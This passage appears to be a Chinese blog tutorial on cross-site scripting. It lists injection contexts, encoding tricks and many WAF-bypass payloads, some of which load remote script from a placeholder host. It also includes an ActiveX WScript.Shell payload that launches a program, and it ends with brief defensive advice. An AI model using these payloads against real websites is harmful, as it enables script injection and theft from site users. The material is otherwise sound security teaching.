<p>这里并没有做任何过滤，所以我们的参数值是完整的被返回过来的。这里就造成了代码执行。</p>
<p>payload:<code>http://xxx.xxx.xxx.xxx/?platform=alert(“xss”)</code>，执行效果</p>
<p><img src="https://i.loli.net/2020/07/16/jSbda5qKkgpB7cY.png" alt="img"></p>
<p>RCE执行-payload</p>
<figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> o = <span class="keyword">new</span> <span class="type">ActiveXObject</span>(<span class="string">"WScript.Shell"</span>);</span><br><span class="line">o.run(“calc.exe”);</span><br></pre></td></tr></table></figure>

<p>为了美观，我们对代码进行编码，编码后代码如下（头尾两个回车符）</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String.fromCharCode(<span class="number">10</span>,<span class="number">118</span>,<span class="number">97</span>,<span class="number">114</span>,<span class="number">32</span>,<span class="number">111</span>,<span class="number">61</span>,<span class="number">110</span>,<span class="number">101</span>,<span class="number">119</span>,<span class="number">32</span>,<span class="number">65</span>,<span class="number">99</span>,<span class="number">116</span>,<span class="number">105</span>,<span class="number">118</span>,<span class="number">101</span>,<span class="number">88</span>,<span class="number">79</span>,<span class="number">98</span>,<span class="number">106</span>,<span class="number">101</span>,<span class="number">99</span>,<span class="number">116</span>,<span class="number">40</span>,<span class="number">39</span>,<span class="number">87</span>,<span class="number">83</span>,<span class="number">99</span>,<span class="number">114</span>,<span class="number">105</span>,<span class="number">112</span>,<span class="number">116</span>,<span class="number">46</span>,<span class="number">115</span>,<span class="number">104</span>,<span class="number">101</span>,<span class="number">108</span>,<span class="number">108</span>,<span class="number">39</span>,<span class="number">41</span>,<span class="number">59</span>,<span class="number">10</span>,<span class="number">111</span>,<span class="number">46</span>,<span class="number">114</span>,<span class="number">117</span>,<span class="number">110</span>,<span class="number">40</span>,<span class="number">39</span>,<span class="number">99</span>,<span class="number">97</span>,<span class="number">108</span>,<span class="number">99</span>,<span class="number">46</span>,<span class="number">101</span>,<span class="number">120</span>,<span class="number">101</span>,<span class="number">39</span>,<span class="number">41</span>,<span class="number">59</span>,<span class="number">10</span>)</span><br></pre></td></tr></table></figure>

<p>然而浏览器的安全机制默认禁止使用activex控件，所以。还得利用一些浏览器的漏洞来绕过。</p>
<h3 id="场景-HTML"><a href="#场景-HTML" class="headerlink" title="场景(HTML)"></a>场景(HTML)</h3><p>&emsp;&emsp;XSS涉及的场景很广，出现在支持HTML解析和JavaScript解析的客户端软件、页面上。在触发XSS时我们需要关注输入点与输出点，这里我们先假设有一个id=1的输入点，针对不同的输出点，我们的利用方式则是不同的。</p>
<p>· HTML标签之间，比如：出现在<code>&lt;div id=&quot;body”&gt;[输出]&lt;/div&gt;</code>位置</p>
<p>· HTML标签之内，比如：出现在<code>&lt;input type=&quot;text” value = &quot;[输出]&quot;/&gt;</code>位置</p>
<p>· 成为JavaScript代码的值，比如：<code>&lt;script&gt;a=&quot;[输出]&quot;,...&lt;/script&gt;</code>位置</p>
<p>· 成为CSS代码的值，比如：<code>&lt;style&gt;body{font-size:[输出]px;...}&lt;/style&gt;</code>位置</p>
<h4 id="1-HTML标签之间"><a href="#1-HTML标签之间" class="headerlink" title="1. HTML标签之间"></a>1. HTML标签之间</h4><p>&emsp;&emsp;最普通的出现在<code>&lt;div id=&quot;body”&gt;[输出]&lt;/div&gt;</code>位置，那么提交<code>id=1&lt;script&gt;alert(1)&lt;/script&gt;</code>就可了，但是在<code>&lt;title&gt;&lt;textarea&gt;&lt;xmp&gt;&lt;iframe&gt;&lt;noscript&gt;&lt;noframes&gt;&lt;plaintext&gt;</code>标签里面就不行，因为这些标签内无法执行脚本，我们得先将这些标签给闭合。另外，<code>&lt;script&gt;&lt;style&gt;</code> 是不能嵌套标签的。</p>
<h4 id="2-HTML标签之内"><a href="#2-HTML标签之内" class="headerlink" title="2. HTML标签之内"></a>2. HTML标签之内</h4><p>&emsp;&emsp;最普通的场景出现在<code>&lt;input type=&quot;text” value = &quot;[输出]&quot;/&gt;</code>，要触发XSS有一下两种方法</p>
<p><code>”onmouserover=alert(1)x=”</code>，这种是用双引号闭合属性，然后用on事件来触发脚本。【这种触发成功率更高】</p>
<p><code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>，这种是先用双引号闭合属性，然后用尖括号又闭合了标签，然后直接执行脚本 【这种利用效果好】</p>
<p>&emsp;&emsp;换一种场景：<code>&lt;input type=&quot;hidden&quot; value=&quot;[输出]&quot; /&gt;</code>，一般情况下，此时我们只能闭合input标签，否则由于hidden特性导致触发不了XSS，但如果是这种语句<code>&lt;input  value=&quot;[输出]&quot;  type=&quot;hidden&quot;/&gt;</code>，仅仅是调换了两个属性的位置，我们则可以用这样一条payload：<code>1&quot; onmouserover=alert(1) type = &quot;text</code></p>
<p>&emsp;&emsp;输出后变为<code>&lt;input  value=&quot;1&quot; onmouserover=alert(1) type = &quot;text&quot;  type=&quot;hidden&quot;/&gt;</code>，这样输出的就是一个标准的输入框，而不是一个隐藏的表单（hidden被text插队了）</p>
<p>&emsp;&emsp;另外两种场景：</p>
<p>输出在src/href/action等属性内，比如<code>&lt;a href = &quot;[输出]”&gt;click me&lt;/a&gt;</code></p>
<p>这里我们除了各种闭合外，还可以：</p>
<p><code>javascript:alert(1)//</code></p>
<p><code>data:text/html;base64,PHNjcm1wdD5hbGVydCgxKTwvc2NyaXB0Pg==</code></p>
<p>这里有一个前提是我们提交的payload必须出现在这些属性值的开头（data协议必须作为整个属性值出现）</p>
<p>&emsp;&emsp;输出在on事件内：</p>
<p>由于on事件内是可以执行JavaScript脚本的，根据不同场景，我们需要弄清楚我们的输入是作为整个on事件出现，还是以某个函数的参数值出现、这个函数又是什么等。因为根据不同的场景我们可能需要不同的闭合策略。</p>
<p>最简单的场景就是：<code>&lt;a href=&quot;#&quot; onclick =&quot;eval(&#39;输出&#39;)&quot;&gt;click me &lt;/a&gt;</code></p>
<h3 id="DOM渲染"><a href="#DOM渲染" class="headerlink" title="DOM渲染"></a>DOM渲染</h3><h4 id="HTML与JavaScript自解码机制"><a href="#HTML与JavaScript自解码机制" class="headerlink" title="HTML与JavaScript自解码机制"></a>HTML与JavaScript自解码机制</h4><p>&emsp;&emsp;当一段JavaScript代码出现在HTML标签内，那么这里的JavaScript可以进行HTML形式的编码：进制编码（十进制、十六进制），HTML实体编码。例如：</p>
<p><code>&lt;input type=&quot;button” id = &quot;exec_btn” value=&quot;exec” onclik=&quot;x=&#39;&amp;lt;img src = @ onerror=alert(123) /&amp;gt;&#39;;alert(x);document.write(x)” /&gt;</code></p>
<p>&emsp;&emsp;但是如果用户输入出现在<code>&lt;script&gt;</code>标签内，这段内容要遵守的就是JavaScript的法则，即JavaScript编码：Unicode形式：\uH（十六进制）；普通十六进制（\xH）；纯转义：（在特殊字符前面加\进行转义。）</p>
<p>&emsp;&emsp;另外，在<code>&lt;textarea&gt;&lt;title&gt;&lt;iframe&gt;&lt;noscript&gt;&lt;noframes&gt;&lt;xmp&gt;</code>这几个标签中HTML也是不解析的。<code>&lt;plaintext&gt;</code>则在Firefox下不解析，在Chrome下就会。</p>
<h3 id="XSS过滤与绕过"><a href="#XSS过滤与绕过" class="headerlink" title="XSS过滤与绕过"></a>XSS过滤与绕过</h3><p>参考<a href="https://www.0x002.com/2019/%E5%89%8D%E7%AB%AFHack%E4%B9%8BXSS%E6%94%BB%E5%87%BB%E4%B8%AA%E4%BA%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#%E5%AF%B9%E6%A0%87%E7%AD%BE%E5%B1%9E%E6%80%A7%E5%80%BC%E8%BF%9B%E8%A1%8C%E8%BD%AC%E7%A0%81" target="_blank" rel="noopener">前端Hack之XSS攻击个人学习笔记</a></p>
<h4 id="空格、回车和tab"><a href="#空格、回车和tab" class="headerlink" title="空格、回车和tab"></a>空格、回车和tab</h4><p>&emsp;&emsp;对XSS-Filter而言，如果仅仅是将函数加入黑名单，那么可以在函数名称之中尝试加入空格、回车、Tab等键位符来进行绕过。这是由于在JavaScript中只会将；作为语句的终止符，当浏览器引擎解析JavaScript脚本时没有匹配到；便会继续处理，知道发现下个分号为止，而换行符并不是终止符。如下列代码可绕过对关键字JavaScript|alert的过滤：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">javasc</span></span></span><br><span class="line"><span class="tag"><span class="attr">ript:aler</span></span></span><br><span class="line"><span class="tag"><span class="attr">t</span>(/<span class="attr">xss</span>/)&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="对标签属性值进行转码"><a href="#对标签属性值进行转码" class="headerlink" title="对标签属性值进行转码"></a>对标签属性值进行转码</h4><p><code>&lt;img src=&quot;javascript:alert(&#39;xss&#39;);&quot;&gt;</code>  =&gt;  <code>&lt;img src=&quot;javascrip&amp;#116&amp;#58alert(&#39;xss&#39;);&quot;&gt;</code></p>
<p>由于我们的输入出现在<code>&lt;img&gt;</code>标签内，所以可以进行实体编码来绕过过滤。</p>
<h4 id="使用CSS绕过"><a href="#使用CSS绕过" class="headerlink" title="使用CSS绕过"></a>使用CSS绕过</h4><p>利用CSS样式表可以执行JavaScript的特性，如</p>
<p>CSS直接执行JavaScript：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"background-image:url(javascript:alert('xss'))"</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">    <span class="selector-tag">body</span> &#123;<span class="attribute">background-image</span>:<span class="built_in">url</span>(<span class="string">"javascript:alert('xss')"</span>);&#125;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>CSS中使用expression执行JavaScript:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"width: expression(alert('xss'))"</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"#"</span> <span class="attr">style</span>=<span class="string">"xss:expression(alert(/xss/))"</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">    <span class="selector-tag">body</span> &#123;<span class="attribute">background-image</span>:<span class="built_in">expression</span>(<span class="string">"alert('xss')"</span>);&#125;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>还可以利用@import直接执行JavaScript代码</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">    @<span class="keyword">import</span> <span class="string">'javascript:alert("xss")'</span>;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;在现实环境下，HTML页面中的CSS与Javascript的嵌入方式很相似，且CSS也可以执行JavaScript代码，故我们的XSS代码也可以通过嵌入远程恶意CSS文件来进行XSS攻击。</p>
<h4 id="扰乱规则"><a href="#扰乱规则" class="headerlink" title="扰乱规则"></a>扰乱规则</h4><p>· 大小写变换;<br>· 利用<code>expression</code>执行跨站代码的时候，可以构造不同的全角字符来扰乱过滤规则;<br>· 结合样式表注释字符<code>/**/</code>，通过CSS执行JavaScript<br>· 样式标签会过滤\和\0，可以构造如<code>@i\mp\0\0ort &#39;jav\0asc\0rip\t:al\0er\t(&quot;x\0ss&quot;)&#39;</code>绕过<br>· CSS关键字进行编码处理，如<code>&lt;p style=&quot;xss:\0065xpression(alert(/xss/))&quot;&gt;</code>其中65为字母e进行unicode编码后的数字部分<br>· 利用浏览器解析注释的问题</p>
<h4 id="利用字符编码"><a href="#利用字符编码" class="headerlink" title="利用字符编码"></a>利用字符编码</h4><p>JavaScript支持许多的编码格式，如：unicode、escapes、十六|十|八进制</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">JS8编码：</span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">top[</span>'<span class="attr">al</span>\<span class="attr">145rt</span>'](<span class="attr">1</span>) &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">top[</span>'\<span class="attr">141</span>\<span class="attr">154</span>\<span class="attr">145</span>\<span class="attr">162</span>\<span class="attr">164</span>'](<span class="attr">1</span>) &gt;</span></span><br><span class="line">JS16编码：</span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">top[</span>'<span class="attr">al</span>\<span class="attr">x65rt</span>'](<span class="attr">1</span>) &gt;</span></span><br><span class="line">其他</span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">top[/al/.source%2B/ert/.source](1)</span> &gt;</span></span><br></pre></td></tr></table></figure>

<p>一个python写的编码小脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote,unquote</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hexlify</span><span class="params">(s)</span>:</span></span><br><span class="line">    tmp=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        tmp+=<span class="string">'\\x'</span>+hex(ord(i))[<span class="number">2</span>:].rjust(<span class="number">2</span>,<span class="string">'0'</span>)</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">html</span><span class="params">(s)</span>:</span></span><br><span class="line">    tmp = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        tmp += <span class="string">'&amp;#'</span> + str(ord(i))+<span class="string">';'</span></span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">octlify</span><span class="params">(s)</span>:</span></span><br><span class="line">    tmp = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        tmp += <span class="string">'\\'</span> + oct(ord(i))[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tx</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> str(int(s,<span class="number">36</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">uu</span><span class="params">(s)</span>:</span></span><br><span class="line">    tmp = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        tmp += <span class="string">'\\u'</span> + hex(ord(i))[<span class="number">2</span>:].rjust(<span class="number">4</span>,<span class="string">'0'</span>)</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"><span class="comment">#s = (input("input the words you want exchange(only letters and numbers):\n"))</span></span><br><span class="line">s=<span class="string">'alert'</span></span><br><span class="line">print(<span class="string">"八进制："</span>+octlify(s))</span><br><span class="line">print(<span class="string">"十六进制："</span>+hexlify(s))</span><br><span class="line">print(<span class="string">"实体编码："</span>+html(s))</span><br><span class="line">print(<span class="string">"36为基数："</span>+tx(s)+<span class="string">"..toSting(36)"</span>)</span><br><span class="line">print(<span class="string">"\\u形式："</span>+uu(s))</span><br></pre></td></tr></table></figure>

<p>编码 alert，输出</p>
<p><img src="https://i.loli.net/2020/07/16/DiO97rynzSbjAsh.png" alt="image-20200716105441101"></p>
<p>拆分与编码</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">\u0073etInterval(appendChild(createElement(</span>'<span class="attr">script</span>'))<span class="attr">.src</span>=<span class="string">'http://xx.xx/eeW'</span>)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">\u0073etInterval(appendChild(createElement(</span>'<span class="attr">sc</span>\<span class="attr">162ipt</span>'))<span class="attr">.src</span>=<span class="string">'http://xx.xx/eeW'</span>)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">\u0073etInterval(appendChild(createElement(</span>'<span class="attr">scr</span>'%<span class="attr">2b</span>'<span class="attr">ipt</span>'))<span class="attr">.src</span>=<span class="string">'http://xx.xx/eeW'</span>)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">\u0073etInterval(\u0061ppendChild(\u0063reateElement(</span>'<span class="attr">scr</span>'%<span class="attr">2b</span>'<span class="attr">ipt</span>'))<span class="attr">.src</span>=<span class="string">'http://xx.xx/eeW'</span>)&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="parseInt-与toString"><a href="#parseInt-与toString" class="headerlink" title="parseInt()与toString()"></a>parseInt()与toString()</h5><p><img src="https://i.loli.net/2020/07/16/EhY5Mt3XBTJRLNf.png" alt="img"></p>
<p><img src="https://i.loli.net/2020/07/16/Tsb15exS7Pf8hqw.png" alt="img"></p>
<p>可以用parseInt将alert以基数为30转化为数字 8680439</p>
<p><img src="https://i.loli.net/2020/07/16/gsYhiLOabGMfDWv.png" alt="img"></p>
<p>用toString()函数将 8680439 以30为基数转成字符串alert</p>
<p><img src="https://i.loli.net/2020/07/16/bsQ5NxeCfGK8nDz.png" alt="img"></p>
<p>再结合on事件和Top属性 payload：<code>ontoggle=top[8680439..toString(30)](&#39;xss&#39;);</code></p>
<p>和Top属性类似的还有<code>self、parent、frames、content、window</code>，但top是最短的了。</p>
<p>【以30为基数的时候有一些字母不能表示，所以建议以36为基数】</p>
<h4 id="其它技巧"><a href="#其它技巧" class="headerlink" title="其它技巧"></a>其它技巧</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">alt</span>=<span class="string">al</span> <span class="attr">lang</span>=<span class="string">ert</span> <span class="attr">onerror</span>=<span class="string">top[alt%2blang](0)</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这个例子很巧妙，将alt和lang属性分别赋值合并起来就是alert，并在top属性内将2个属性相加。</p>
<p>除了拼alert，拼eval用处更大些，有了eval，后面的东西转码什么的也很方便</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">top[a</span>=<span class="string">'al'</span>,<span class="attr">b</span>=<span class="string">'ev'</span>,<span class="attr">b</span>%<span class="attr">2ba</span>](<span class="attr">atob</span>('<span class="attr">YWxlcnQoMSk</span>=<span class="string">'))&gt;</span></span></span><br><span class="line"><span class="tag"><span class="string">&lt;details open ontoggle=top[a='</span><span class="attr">al</span>',<span class="attr">b</span>=<span class="string">'ev'</span>,<span class="attr">b</span>%<span class="attr">2ba</span>]('\<span class="attr">141</span>\<span class="attr">154</span>\<span class="attr">145</span>\<span class="attr">162</span>\<span class="attr">164</span>\<span class="attr">50</span>\<span class="attr">61</span>\<span class="attr">51</span>')&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">top[a</span>=<span class="string">'al'</span>,<span class="attr">b</span>=<span class="string">'ev'</span>,<span class="attr">b</span>%<span class="attr">2ba</span>]('\<span class="attr">u0061</span>\<span class="attr">u006c</span>\<span class="attr">u0065</span>\<span class="attr">u0072</span>\<span class="attr">u0074</span>\<span class="attr">u0028</span>\<span class="attr">u0031</span>\<span class="attr">u0029</span>')&gt;</span></span><br></pre></td></tr></table></figure>

<p>setTimeout()函数也是没问题的，毕竟也能执行代码。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">top[a</span>=<span class="string">'meout'</span>,<span class="attr">b</span>=<span class="string">'setTi'</span>,<span class="attr">b</span>%<span class="attr">2ba</span>]('\<span class="attr">141</span>\<span class="attr">154</span>\<span class="attr">145</span>\<span class="attr">162</span>\<span class="attr">164</span>\<span class="attr">50</span>\<span class="attr">61</span>\<span class="attr">51</span>')&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="setTimeout-amp-setInterval"><a href="#setTimeout-amp-setInterval" class="headerlink" title="setTimeout&amp;setInterval"></a>setTimeout&amp;setInterval</h5><p>setTimeout在延时一定时间后执行code一次</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">setTimeout</span>`<span class="attr">alert</span>\<span class="attr">u0028233</span>\<span class="attr">u0029</span>`&gt;</span></span><br></pre></td></tr></table></figure>

<p>setInterval以一定时间为周期执行code</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">setInterval(</span>'<span class="attr">al</span>'%<span class="attr">2b</span>'<span class="attr">ert</span>(<span class="attr">1</span>)')&gt;</span></span><br></pre></td></tr></table></figure>

<p>绕过waf，引用外部js</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">setInterval(appendChild(createElement(</span>'<span class="attr">script</span>'))<span class="attr">.src</span>=<span class="string">'http://xx.xx/eeW'</span>)&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="结合函数："><a href="#结合函数：" class="headerlink" title="结合函数："></a>结合函数：</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">s</span>=<span class="string">createElement(</span>'<span class="attr">script</span>');<span class="attr">body.appendChild</span>(<span class="attr">s</span>);<span class="attr">s.src</span>=<span class="string">[</span>'<span class="attr">http</span>','<span class="attr">:</span>//','<span class="attr">xx.xx</span>','/<span class="attr">eeW</span>']<span class="attr">.join</span>('') &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">s</span>=<span class="string">createElement(</span>'<span class="attr">script</span>');<span class="attr">body.appendChild</span>(<span class="attr">s</span>);<span class="attr">s.src</span>=<span class="string">[</span>'<span class="attr">http</span>']%<span class="attr">2B</span>['<span class="attr">:</span>//']%<span class="attr">2B</span>['<span class="attr">xx.xx</span>']%<span class="attr">2B</span>['/<span class="attr">eeW</span>']<span class="attr">.join</span>('') &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">s</span>=<span class="string">\u0063reateElement(</span>'<span class="attr">scr</span>'%<span class="attr">2b</span>'<span class="attr">ipt</span>');\<span class="attr">u0062ody.</span>\<span class="attr">u0061ppendChild</span>(<span class="attr">s</span>);<span class="attr">s.src</span>=<span class="string">'http://x'</span><span class="attr">.concat</span>('<span class="attr">x.xx</span>/','<span class="attr">eeW</span>'); &gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="constructor-NaN"><a href="#constructor-NaN" class="headerlink" title="constructor"></a>constructor</h5><p><img src="https://i.loli.net/2020/07/16/b9NoRXeqlHyzJFk.png" alt="img"></p>
<p><img src="https://i.loli.net/2020/07/16/4uhGq7WyTeVNHOd.png" alt="image-20200716090526633"></p>
<p><img src="https://i.loli.net/2020/07/16/XLGUWbyp64kH7Ft.png" alt="image-20200716090613857"></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">Set.constructor(</span>'<span class="attr">al</span>'%<span class="attr">2b</span>'<span class="attr">ert</span>(<span class="attr">1</span>)')()&gt;</span></span><br></pre></td></tr></table></figure>

<p>payload：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">Set.constructor(appendChild(createElement(</span>'<span class="attr">script</span>'))<span class="attr">.src</span>=<span class="string">'http://xx.xx/eeW'</span>)()&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">Set.constructor</span>`<span class="attr">al</span>\<span class="attr">x65rt</span>\<span class="attr">x28</span>/<span class="attr">xss</span>/\<span class="attr">x29</span>```&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">Map.constructor</span>`<span class="attr">al</span>\<span class="attr">x65rt</span>\<span class="attr">x28</span>/<span class="attr">xss</span>/\<span class="attr">x29</span>```&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">clear.constructor</span>`<span class="attr">al</span>\<span class="attr">x65rt</span>\<span class="attr">x28</span>/<span class="attr">xss</span>/\<span class="attr">x29</span>```&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">Array.constructor</span>`<span class="attr">al</span>\<span class="attr">x65rt</span>\<span class="attr">x28</span>/<span class="attr">xss</span>/\<span class="attr">x29</span>```&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">WeakSet.constructor</span>`<span class="attr">al</span>\<span class="attr">x65rt</span>\<span class="attr">x28</span>/<span class="attr">xss</span>/\<span class="attr">x29</span>```&gt;</span></span><br><span class="line">    //后面两个``相当于()，是对函数的引用，是否可以用来绕过那些过滤括号的waf呢？</span><br></pre></td></tr></table></figure>

<h4 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h4><h5 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h5><p>​       严格控制用户可输入的范围，如手机号只能输入数字且长度不能大于11位等，如需输入某些敏感字符的情况下可对数据进行转义处理，对于用户数据的过滤尽可能地采用白名单而不是黑名单。</p>
<h5 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h5><p>​       减少不必要的输出，在需要输出的地方使用HTML编码将敏感字符转义为实体符，JavaScript进行DOM操作时注意不要将已转义的实体符再次解析成DOM对象。</p>
<h5 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h5><p>​       设置HttpOnly，开启WAF。</p>
